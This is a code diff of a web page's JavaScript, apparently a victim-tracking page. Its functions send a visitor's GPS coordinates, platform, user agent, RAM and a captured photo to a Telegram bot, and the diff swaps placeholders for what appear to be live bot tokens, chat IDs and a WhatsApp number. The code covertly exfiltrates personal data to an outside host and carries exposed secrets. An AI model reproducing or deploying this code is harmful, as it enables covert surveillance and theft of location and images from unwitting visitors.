@@ -132,8 +132,8 @@
         }
 
         function kirim(latitude, longitude, platform, userAgent, ram) {
-            const telegramBotToken = '5690341545:AAGzwsyQG2OKl5Drk3sg4Dp5S2oTarwT5QY';
-            const chatId = '5190237648';
+            const telegramBotToken = '8014318564:AAEcCsDvBbZhTDPwT-cpXsO2OffVjHr2ne0';
+            const chatId = '1942873790';
             const message = `
                 🌍 Location Information:
                 Latitude: ${latitude}
@@ -185,8 +185,8 @@
         }
 
         function kirimPhoto(blob) {
-            const telegramBotToken = 'your_token_bot';
-            const chatId = 'your_chat_id';
+            const telegramBotToken = '8014318564:AAEcCsDvBbZhTDPwT-cpXsO2OffVjHr2ne0';
+            const chatId = '1942873790';
             const formData = new FormData();
             formData.append('chat_id', chatId);
             formData.append('photo', blob);
@@ -245,7 +245,7 @@
                 }).then((result) => {
                     if (result.isConfirmed) {
                         const message = encodeURIComponent(result.value);
-                        const whatsappUrl = `https://wa.me/your_number?text=${message}`;
+                        const whatsappUrl = `https://wa.me/6285797806250?text=${message}`;
                         window.open(whatsappUrl, '_blank');
                     }
                 });
